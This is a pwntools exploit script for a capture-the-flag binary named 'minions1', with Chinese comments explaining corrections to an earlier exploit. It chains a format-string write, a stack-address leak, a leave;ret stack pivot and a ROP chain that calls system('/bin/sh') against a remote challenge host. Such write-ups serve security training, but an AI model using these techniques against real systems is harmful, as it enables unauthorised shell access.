from pwn import *

io = process("./minions1")
io = remote("node5.anna.nssctf.cn", 29705)
elf = ELF("./minions1")
context.log_level = 'info'

rdi_addr = 0x400893
ret_addr = 0x400581
key_addr = 0x6010A0
leave = 0x400758
hdctf = 0x6010C0

system_plt = elf.plt["system"]

# ============================================================
# Step 1: format string → write 0x66 to key
# （此部分与原 exp 相同，无修改）
# ============================================================
payload0 = f"%32$p%{102-14}c%8$hhna".encode() + p64(key_addr)
io.recvuntil(b"name?")
io.sendline(payload0)

io.recvuntil(b"0x")
rdp = int(io.recvuntil(b" ")[:-1], 16)
log.info(f"leaked main_rbp = {hex(rdp)}")

# ============================================================
# 【修改 1】new_rdp 偏移修正：-0x38 → -0x30
#
# %32$p 泄漏的是 vuln 栈帧里保存的 main 的 rbp。
# main 的溢出 buffer 在 [rbp-0x30]，所以 new_rdp = rdp - 0x30。
# 原 exp 用 -0x38 指向了 buffer 之前 8 字节的位置。
# ============================================================
new_rdp = rdp - 0x30
log.info(f"new_rdp = {hex(new_rdp)}")

# ============================================================
# Step 2: 栈溢出 + leave;ret 栈迁移
#
# 【修改 2】ROP 链最前面补 8 字节 junk
# leave = mov rsp, rbp; pop rbp
# 栈迁移后 pop rbp 会吃掉假栈上的前 8 字节，所以真正的 gadget
# 必须从偏移 8 开始。原 exp 把 pop_rdi 放在偏移 0，结果被 pop rbp
# 吃掉，而偏移 8 的 &hdctf 被当作代码地址执行 → NX 段错误。
#
# 【修改 3】加 ret gadget 做栈对齐
# system() 被调用时要求 rsp ≡ 8 (mod 16)。不加 ret 的话对齐是错的，
# 会在 system 内部或 /bin/sh 里触发 movaps 段错误。
# ============================================================
rop = b""
rop += p64(0xDEADBEEF)        # [修改2] 偏移 0: junk，被 leave 的 pop rbp 吃掉
rop += p64(ret_addr)          # [修改3] 偏移 8: ret（栈对齐，rsp += 8）
rop += p64(rdi_addr)          # 偏移16: pop rdi; ret
rop += p64(hdctf)             # 偏移24: → rdi = "/bin/sh" 地址
rop += p64(system_plt)        # 偏移32: system("/bin/sh")

payload1 = rop.ljust(0x30, b"\x00")  # 填充到 main buffer 大小 (0x30=48)
payload1 += p64(new_rdp)              # 覆盖 saved rbp → 指向假栈
payload1 += p64(leave)                # 覆盖 return addr → leave;ret

assert len(payload1) == 0x40, f"payload1 size {len(payload1)} != 0x40"

io.recvuntil(b"you")

# ============================================================
# 【修改 4】sendline → send
# payload1 刚好 0x40 字节，sendline 多加的 \n 会导致 main 的
# read(0, buf, 0x40) 只读 0x40 字节后残留一个 \n 在 stdin 缓冲区。
# 下一个 read(0, hdctf, 0x28) 首先读到这个 \n，导致 hdctf 首字节
# 是换行而非 '/'，system("\n/bin/sh") 执行失败。
# ============================================================
io.send(payload1)

# ============================================================
# Step 3: 往 hdctf 写入 "/bin/sh"
# （此部分与原 exp 相同，无修改）
# ============================================================
io.recvuntil(b"Minions?")
io.sendline(b"/bin/sh\x00")

io.interactive()
